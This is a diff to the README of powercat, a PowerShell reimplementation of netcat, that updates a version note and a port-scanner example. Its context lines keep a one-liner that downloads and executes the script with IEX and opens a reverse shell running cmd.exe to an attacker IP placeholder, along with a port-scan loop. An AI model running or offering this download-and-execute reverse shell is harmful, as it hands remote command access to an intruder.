@@ -1,6 +1,6 @@
 #powercat
 
-Netcat: The powershell version. (v2 compatible)
+Netcat: The powershell version. (Powershell Version 2 and Later Supported)
 
 ### Parameters:
     -l    Listen for a connection.                             [Switch]
@@ -42,4 +42,4 @@ Netcat: The powershell version. (v2 compatible)
     Download and Execute Powercat Reverse Shell One-Liner (Replace <Attacker IP>):
         powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c <ATTACKER IP> 443 -e cmd.exe"
     Basic TCP Port Scanner:
-        foreach($p in (21,22,80,443)){powercat -c 10.1.1.10 -p $p -t 1 -Verbose}
+        (21,22,80,443) | % {powercat -c 10.1.1.10 -p $_ -t 1 -Verbose -d}
